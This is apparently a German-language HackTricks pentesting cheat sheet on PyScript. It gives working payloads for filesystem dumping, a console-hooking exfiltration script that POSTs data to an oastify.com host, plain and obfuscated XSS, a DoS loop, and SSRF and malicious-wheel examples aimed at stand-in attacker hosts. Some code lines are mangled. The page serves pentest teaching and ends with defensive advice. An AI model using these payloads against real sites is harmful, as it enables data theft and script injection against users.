# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting-Leitfaden

PyScript ist ein neues Framework, das dafür entwickelt wurde, Python in HTML zu integrieren, sodass es zusammen mit HTML verwendet werden kann. In diesem Cheat Sheet erfahren Sie, wie Sie PyScript für Ihre Pentesting-Zwecke verwenden können.

### Dumping / Abrufen von Dateien aus dem virtuellen Emscripten-Speicherdateisystem:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Ergebnis:

![PyScript Pentesting Guide - Dumping / Abrufen von Dateien aus dem virtuellen Emscripten-Speicherdateisystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB-Datenexfiltration des virtuellen Emscripten-Speicherdateisystems (Konsolenüberwachung)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Ergebnis:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Gewöhnlich)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Ergebnis:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Ergebnis:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Ergebnis:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Endlosschleife)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Endlosschleife)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Ergebnis:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Endlosschleife):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Neue Schwachstellen & Techniken (2023-2025)

### Server-Side Request Forgery via unkontrollierte Weiterleitungen (CVE-2025-50182)

`urllib3 < 2.5.0` ignoriert die Parameter `redirect` und `retries`, wenn es **innerhalb der Pyodide-Laufzeitumgebung** ausgeführt wird, die mit PyScript ausgeliefert wird. Wenn ein Angreifer die Ziel-URLs beeinflussen kann, kann er den Python-Code dazu zwingen, Weiterleitungen über verschiedene Domains hinweg zu verfolgen, selbst wenn der Entwickler diese ausdrücklich deaktiviert hat – wodurch die Anti-SSRF-Logik effektiv umgangen wird.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
In `urllib3 2.5.0` behoben – aktualisiere das Paket in deinem PyScript-Image oder pinne eine sichere Version mit `packages = ["urllib3>=2.5.0"]`. Weitere Informationen findest du im offiziellen CVE-Eintrag.

### Beliebiges Laden von Paketen und Supply-Chain-Angriffe

Da PyScript beliebige URLs in der `packages`-Liste erlaubt, kann ein Angreifer, der die Konfiguration ändern oder einschleusen kann, **vollständig beliebigen Python-Code** im Browser des Opfers ausführen:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Es werden nur reine Python-Wheels benötigt – es ist kein WebAssembly-Kompilierungsschritt erforderlich.* Stelle sicher, dass die Konfiguration nicht vom Benutzer kontrolliert wird, und hoste vertrauenswürdige Wheels auf deiner eigenen Domain mit HTTPS und SRI-Hashes.

### Änderungen an der Ausgabesanitisierung (2023+)

* `print()` fügt weiterhin rohes HTML ein und ist daher XSS-anfällig (siehe Beispiele oben).
* Der neuere Helfer `display()` **escaped HTML standardmäßig** – rohes Markup muss in `pyscript.HTML()` eingeschlossen werden.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Dieses Verhalten wurde 2023 eingeführt und ist im offiziellen Built-ins guide dokumentiert. Verwende `display()` für nicht vertrauenswürdige Eingaben und vermeide es, `print()` direkt aufzurufen.<sup>[[2]](#references)</sup>

---

## Defensive Best Practices

* **Pakete aktuell halten** – aktualisiere auf `urllib3 >= 2.5.0` und erstelle regelmäßig die mit der Website ausgelieferten Wheels neu.
* **Paketquellen einschränken** – verweise nur auf PyPI-Namen oder URLs gleichen Ursprungs, idealerweise geschützt durch Sub-resource Integrity (SRI).
* **Content Security Policy härten** – verbiete Inline-JavaScript (`script-src 'self' 'sha256-…'`), damit eingeschleuste `<script>`-Blöcke nicht ausgeführt werden können.
* **Vom Benutzer bereitgestellte `<py-script>`- / `<script type="py">`-Tags verbieten** – bereinige HTML auf dem Server, bevor es an andere Benutzer zurückgegeben wird.
* **Worker isolieren** – wenn du keinen synchronen Zugriff von Workern auf das DOM benötigst, aktiviere das Flag `sync_main_only`, um die Anforderungen an `SharedArrayBuffer`-Header zu vermeiden.

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
